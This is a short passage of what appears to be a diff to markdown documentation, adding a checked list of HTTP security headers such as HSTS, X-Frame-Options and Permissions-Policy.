+✅ Strict-Transport-Security (HSTS)
+✅ X-Frame-Options
+✅ X-Content-Type-Options
+✅ Referrer-Policy
+✅ Permissions-Policy
+```
 
 ---
 
